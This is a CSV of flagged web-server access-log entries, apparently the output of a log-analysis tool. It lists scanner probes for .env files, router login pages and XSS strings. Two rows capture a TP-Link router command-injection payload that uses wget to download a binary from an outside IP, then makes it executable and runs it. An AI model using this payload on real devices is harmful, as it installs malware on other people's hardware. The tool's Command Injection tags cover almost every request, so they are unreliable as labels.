access.log,Command Injection,06/Apr/2024:00:13:58 +0000,/,198.74.56.46,-
access.log,Command Injection,06/Apr/2024:00:14:25 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:00:15:54 +0000,/,94.154.33.37,-
access.log,Command Injection,06/Apr/2024:00:19:43 +0000,http://google.com,93.115.29.69,-
access.log,Command Injection,06/Apr/2024:00:19:44 +0000,http://google.com/login.php,93.115.29.69,-
access.log,Error Codes,06/Apr/2024:00:24:09 +0000,/boaform/admin/formLogin,185.94.29.162,-
access.log,Command Injection,06/Apr/2024:00:24:09 +0000,/boaform/admin/formLogin,185.94.29.162,-
access.log,Command Injection,06/Apr/2024:00:35:16 +0000,/,45.79.181.94,-
access.log,XSS,06/Apr/2024:00:45:14 +0000,/login.php/?%3Cscript%3E,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:14 +0000,/login.php/?%3Cscript%3E,119.74.129.29,-
access.log,XSS,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,XSS,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:14 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Unusual File Types and Paths,06/Apr/2024:00:45:27 +0000,/login.php/.config,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:27 +0000,/login.php/.config,119.74.129.29,-
access.log,Unusual File Types and Paths,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Unusual File Types and Paths,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:27 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:57 +0000,/login.php/where=union,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:58 +0000,/login.php/dvwa/css/login.css,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:45:58 +0000,/login.php/dvwa/images/login_logo.png,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:53:35 +0000,/,146.19.24.28,-
access.log,Command Injection,06/Apr/2024:00:54:02 +0000,/log_analysis_report.html,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:54:02 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log,Error Codes,06/Apr/2024:00:54:02 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:00:54:02 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:01:22:22 +0000,/,69.164.217.245,-
access.log,Command Injection,06/Apr/2024:01:39:58 +0000,/,221.122.67.75,-
access.log,Command Injection,06/Apr/2024:01:39:58 +0000,/login.php,221.122.67.75,-
access.log,Command Injection,06/Apr/2024:01:44:12 +0000,/,172.104.11.34,-
access.log,Command Injection,06/Apr/2024:01:45:57 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:01:46:29 +0000,/,45.79.181.223,-
access.log,Command Injection,06/Apr/2024:01:58:21 +0000,/,69.164.217.74,-
access.log,Command Injection,06/Apr/2024:02:03:16 +0000,/,146.19.24.28,-
access.log,Error Codes,06/Apr/2024:02:14:01 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:02:14:01 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:02:14:01 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:02:14:17 +0000,/,198.235.24.129,-
access.log,Command Injection,06/Apr/2024:02:31:17 +0000,/,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:02:36:24 +0000,/,45.79.181.104,-
access.log,Command Injection,06/Apr/2024:02:45:36 +0000,/,185.224.128.43,-
access.log,Command Injection,06/Apr/2024:02:57:35 +0000,/log_analysis_report.html,101.127.15.128,-
access.log,Error Codes,06/Apr/2024:02:57:35 +0000,/sd,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:02:57:35 +0000,/sd,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:02:57:35 +0000,/events_errors_line_plot.png,101.127.15.128,-
access.log,Command Injection,06/Apr/2024:03:09:52 +0000,/,146.19.24.28,-
access.log,Command Injection,06/Apr/2024:03:10:42 +0000,/log_analysis_report.html,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:03:10:42 +0000,/events_errors_line_plot.png,119.74.129.29,-
access.log,Error Codes,06/Apr/2024:03:10:42 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:03:10:42 +0000,/sd,119.74.129.29,-
access.log,Command Injection,06/Apr/2024:03:34:00 +0000,/events_errors_line_plot.png,202.166.151.1,-
access.log,Error Codes,06/Apr/2024:03:34:00 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:00 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/css/main.css,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/images/logo.png,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/js/dvwaPage.js,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:34:01 +0000,/dvwa/js/add_event_listeners.js,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:39:25 +0000,/log_analysis_report.html,202.166.151.1,-
access.log,Error Codes,06/Apr/2024:03:39:25 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:39:25 +0000,/sd,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:40:17 +0000,-,202.166.151.1,-
access.log,Command Injection,06/Apr/2024:03:47:04 +0000,/,69.164.217.245,-
access.log,Command Injection,06/Apr/2024:03:47:54 +0000,/,45.79.181.94,-
access.log,Command Injection,06/Apr/2024:03:48:32 +0000,/,45.79.181.94,-
access.log,Error Codes,06/Apr/2024:03:58:38 +0000,/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk),185.224.128.34,-
access.log,Command Injection,06/Apr/2024:03:58:38 +0000,/cgi-bin/luci/;stok=/locale?form=country&amp;operation=write&amp;country=$(cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F103.163.214.97%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk),185.224.128.34,-
access.log,Error Codes,06/Apr/2024:03:58:58 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:03:58:58 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:03:58:58 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:04:09:42 +0000,/,45.79.128.205,-
access.log,Command Injection,06/Apr/2024:04:09:50 +0000,/,45.79.181.179,-
access.log,Command Injection,06/Apr/2024:04:11:13 +0000,/,45.79.163.53,-
access.log,Command Injection,06/Apr/2024:04:13:34 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:04:21:44 +0000,/,45.33.80.243,-
access.log,Command Injection,06/Apr/2024:04:23:21 +0000,-,172.105.128.12,-
access.log,Command Injection,06/Apr/2024:04:33:21 +0000,-,205.210.31.137,-
access.log,Command Injection,06/Apr/2024:04:33:21 +0000,-,205.210.31.137,-
access.log,Error Codes,06/Apr/2024:05:21:49 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:05:21:49 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:05:21:49 +0000,/,54.36.115.221,-
access.log,Unusual Request Methods,06/Apr/2024:05:26:05 +0000,google.com:443,87.121.69.52,-
access.log,Command Injection,06/Apr/2024:05:26:05 +0000,google.com:443,87.121.69.52,-
access.log,Command Injection,06/Apr/2024:05:37:52 +0000,/,45.79.163.53,-
access.log,Command Injection,06/Apr/2024:05:40:34 +0000,/,172.104.11.51,-
access.log,Command Injection,06/Apr/2024:05:41:16 +0000,/,45.33.80.243,-
access.log,Command Injection,06/Apr/2024:05:41:33 +0000,/,172.104.11.46,-
access.log,Command Injection,06/Apr/2024:05:43:12 +0000,/,172.104.11.51,-
access.log,Command Injection,06/Apr/2024:05:43:31 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:05:45:04 +0000,/,45.79.128.205,-
access.log,Command Injection,06/Apr/2024:05:47:29 +0000,/,45.79.181.223,-
access.log,Command Injection,06/Apr/2024:05:47:31 +0000,/,45.79.168.172,-
access.log,Command Injection,06/Apr/2024:05:50:05 +0000,/,172.104.11.51,-
access.log,Command Injection,06/Apr/2024:05:50:07 +0000,/,35.203.211.129,-
access.log,Command Injection,06/Apr/2024:05:50:08 +0000,/login.php,35.203.211.129,-
access.log,Command Injection,06/Apr/2024:05:50:46 +0000,/,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:05:50:56 +0000,/,66.175.213.4,-
access.log,Command Injection,06/Apr/2024:05:51:05 +0000,/,172.105.128.12,-
access.log,Command Injection,06/Apr/2024:05:52:04 +0000,/,172.104.11.34,-
access.log,Command Injection,06/Apr/2024:05:52:51 +0000,/,172.104.11.4,-
access.log,Command Injection,06/Apr/2024:05:56:32 +0000,/,45.79.172.21,-
access.log,Command Injection,06/Apr/2024:05:59:28 +0000,/,172.105.128.13,-
access.log,Command Injection,06/Apr/2024:06:14:27 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:16:36 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:28:32 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:28:48 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:29:21 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:29:32 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:30:10 +0000,-,45.79.181.251,-
access.log,Command Injection,06/Apr/2024:06:30:40 +0000,/,172.105.128.11,-
access.log,Command Injection,06/Apr/2024:06:34:37 +0000,/,45.79.181.104,-
access.log,Unusual Request Methods,06/Apr/2024:06:39:38 +0000,google.com:443,45.125.66.34,-
access.log,Command Injection,06/Apr/2024:06:39:38 +0000,google.com:443,45.125.66.34,-
access.log,Command Injection,06/Apr/2024:06:41:14 +0000,/,185.180.140.5,-
access.log,Command Injection,06/Apr/2024:06:41:14 +0000,/login.php,185.180.140.5,-
access.log,Command Injection,06/Apr/2024:06:46:12 +0000,-,198.235.24.74,-
access.log,Command Injection,06/Apr/2024:06:46:12 +0000,-,198.235.24.74,-
access.log,Command Injection,06/Apr/2024:06:46:19 +0000,/,146.19.24.28,-
access.log,Error Codes,06/Apr/2024:06:54:03 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:06:54:03 +0000,/.env,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:06:54:03 +0000,/,54.36.115.221,-
access.log,Command Injection,06/Apr/2024:06:57:12 +0000,/,185.191.126.213,-
